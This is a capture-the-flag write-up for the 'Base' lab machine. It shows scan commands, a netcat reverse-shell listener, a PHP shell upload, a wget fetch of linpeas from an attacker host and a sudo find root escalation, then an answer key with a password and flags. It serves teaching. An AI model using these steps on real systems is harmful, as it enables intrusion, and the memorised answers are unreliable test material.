# Base - Very Easy

```shell
rustscan -a 10.129.195.152 --range 0-65535 --ulimit 5000 -- -sV

feroxbuster -u http://10.129.195.152 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

nc -nvlp 4444
#setup listener
#upload reverse shell file to /upload.php
#access reverse shell at /_uploaded/reverse-shell.php

python3 -c 'import pty;pty.spawn("/bin/bash")'

ls /home

#get linpeas.sh from attacker machine
#in attacker machine
python3 -m http.server

#in reverse shell
cd /tmp

wget http://10.10.14.40:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

ssh john@10.129.195.152
#use the password found earlier using linpeas.sh

cat user.txt

sudo -l
#we can run find as root

#using exploit from gtfobins
sudo /usr/bin/find . -exec /bin/sh \; -quit

#we get root shell
cat /root/root.txt
```

```markdown
Open ports & services:

  * 22 - ssh - OpenSSH 7.6p1
  * 80 - http - Apache httpd 2.4.29 (Ubuntu)

We can start enumerating web directories and explore the website.

We get /login/login.php, which leads us to a login page.

Checking /login, we have three files - config.php, login.php, and login.php.swp

Now, the .swp file contains PHP code, this could be related to the login functionality.

The .swp file shows that /login/login.php is using strcmp(), and there are various methods to bypass it.

A simple technique to bypass it is to intercept request in Burp Suite, and change password variable to an array; this would return True in this case and give us access to /upload.php

Furthermore, we can access uploaded files at /_uploaded

Now, we can upload a reverse shell and setup listener, and access the uploaded shell to give us shell access.

We get reverse shell as www-data; we can look for privesc using linpeas.sh

Now, linpeas.sh shows us a password found in config PHP files - we can use this password to SSH as john.

Using 'sudo -l', we can see that 'find' can be run as root; we can exploit this by using GTFObins.

Once /usr/bin/find is exploited, we get root shell.
```

1. Which two TCP ports are open on the remote host? - 22,80

2. What is the URL for the login page? - /login/login.php

3. How many files are present in the '/login' directory? - 3

4. What is the file extension of a swap file? - .swp

5. Which PHP function is being used in the backend code to compare the user submitted username and password to the valid username and password? - strcmp()

6. In which directory are the uploaded files stored? - /_uploaded

7. Which user exists on the remote host with a home directory? - john

8. What is the password for the user present on the system? - thisisagoodpassword

9. What is the full path to the command that the user john can run as user root on the remote host? - /usr/bin/find

10. What action can the find command use to execute commands? - exec

11. Submit user flag - f54846c258f3b4612f78a819573d158e

12. Submit root flag - 51709519ea18ab37dd6fc58096bea949
